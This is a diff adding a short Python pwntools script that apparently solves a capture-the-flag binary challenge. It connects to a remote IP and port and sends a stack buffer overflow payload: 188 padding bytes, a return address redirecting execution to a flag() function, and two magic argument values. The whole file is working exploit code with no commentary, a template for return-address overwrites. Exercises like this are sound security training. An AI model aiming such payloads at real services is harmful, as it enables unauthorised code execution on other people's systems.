@@ -1,0 +1,16 @@
+from pwn import *
+
+def exploit():
+    p = remote('94.237.53.134', 47289)
+    
+    payload = b'A' * 188
+    payload += p32(0x080491e2)  # flag() addr
+    payload += b'mula'           # return addr pour flag()
+    payload += p32(0xdeadbeef)   # arg1 = 0xdeadbeef
+    payload += p32(0xc0ded00d)   # arg2 = 0xc0ded00d
+    
+    p.sendline(payload)
+    p.interactive()
+
+if __name__ == '__main__':
+    exploit()
